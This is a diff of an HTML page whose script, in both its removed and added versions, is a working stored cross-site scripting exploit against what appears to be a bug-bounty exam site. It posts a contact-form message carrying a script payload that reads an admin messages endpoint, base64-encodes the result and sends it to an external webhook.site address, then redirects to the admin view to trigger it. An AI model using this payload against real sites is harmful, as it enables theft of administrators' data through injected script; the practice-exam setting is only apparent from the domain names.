@@ -2,36 +2,22 @@
 <html>
 <body>
     <script>
-        const webhook = "https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6";
-        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";
-        
-        // This is the payload that will be stored in the database
-        const xssPayload = `<script>fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43').then(r=>r.text()).then(t=>location.replace('${webhook}?flag='+btoa(t)))<\/script>`;
-
-        async function launchExploit() {
-            // Step 1: Submit the message
-            const response = await fetch(targetApi, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "name": "Saja",
-                    "email": "research@seoulaura.com",
-                    "subject": "Urgent Report",
-                    "message": xssPayload,
-                    "category": "technical",
-                    "priority": "high"
-                })
-            });
-
-            const result = await response.json();
-            const newMessageId = result.data.id;
-
-            // Step 2: Redirect the Admin to the page where the XSS lives
-            // Adjust this URL to match the actual path where admins view messages
-            window.location.href = `https://bugbounty-exam.hashacademy.co/admin/view/${newMessageId}`;
-        }
-
-        launchExploit();
+       // 1. Submit the message containing the XSS
+fetch('https://api-bugbounty-exam.hashacademy.co/api/contact/submit', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        "name": "Saja",
+        "email": "research@seoulaura.com",
+        "subject": "Urgent",
+        "message": "<script>fetch('/api/admin/messages/69ea47fabee6d6b7c6645a43').then(r=>r.text()).then(t=>location='https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6?flag='+btoa(t))<\/script>",
+        "category": "technical",
+        "priority": "high"
+    })
+}).then(r => r.json()).then(data => {
+    // 2. Redirect the admin to the newly created message to trigger the script above
+    location.href = 'https://bugbounty-exam.hashacademy.co/admin/view/' + data.data.id;
+});
     </script>
 </body>
 </html>
